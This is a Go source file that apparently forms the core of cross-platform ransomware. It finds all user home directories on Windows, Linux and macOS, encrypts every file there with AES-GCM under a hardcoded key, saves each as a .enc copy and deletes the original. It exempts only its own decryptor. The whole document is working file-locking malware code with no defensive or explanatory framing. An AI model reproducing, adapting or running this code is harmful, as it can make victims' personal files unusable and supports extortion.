// encrypt_files.go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

var secretKey string

func main() {
	if len(secretKey) == 0 {
		secretKey = "MyVerySecretKeyForEncryption1234"
	}

	userDirectories, err := getUserDirectories()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	for _, directory := range userDirectories {
		err := filepath.Walk(directory, func(path string, f os.FileInfo, err error) error {
			return encryptFileAtPath(path, f, err, []byte(secretKey))
		})

		if err != nil {
			fmt.Println("Error:", err)
		}
	}
}

func encryptFileAtPath(path string, f os.FileInfo, err error, key []byte) error {
	if err != nil {
		fmt.Println("Error:", err)
		return nil
	}

	if !f.IsDir() && shouldEncrypt(path) {
		fmt.Println("Encrypting file:", path)
		if err := encryptAndReplaceFile(path, key); err != nil {
			fmt.Println("Encryption error:", err)
		}
	}

	return nil
}

func shouldEncrypt(path string) bool {
	return !strings.Contains(path, "decrypt_files_linux")
}

func getUserDirectories() ([]string, error) {
	switch runtime.GOOS {
	case "windows":
		return getWindowsUserDirectories()
	case "linux":
		return []string{"/home/"}, nil
	case "darwin":
		return []string{"/Users/"}, nil
	default:
		return nil, fmt.Errorf("unsupported OS")
	}
}

func getWindowsUserDirectories() ([]string, error) {
	cmd := exec.Command("wmic", "logicaldisk", "get", "name")
	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		return nil, err
	}

	driveStrings := strings.Fields(out.String())
	var userDirs []string
	for _, drive := range driveStrings[1:] {
		userDirs = append(userDirs, drive+"\\Users\\")
	}
	return userDirs, nil
}

func encryptAndReplaceFile(inputFile string, key []byte) error {
	plainText, err := ioutil.ReadFile(inputFile)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := gcm.Seal(nonce, nonce, plainText, nil)
	if err = ioutil.WriteFile(inputFile+".enc", ciphertext, 0777); err != nil {
		return err
	}

	if err = os.Remove(inputFile); err != nil {
		return err
	}

	return nil
}
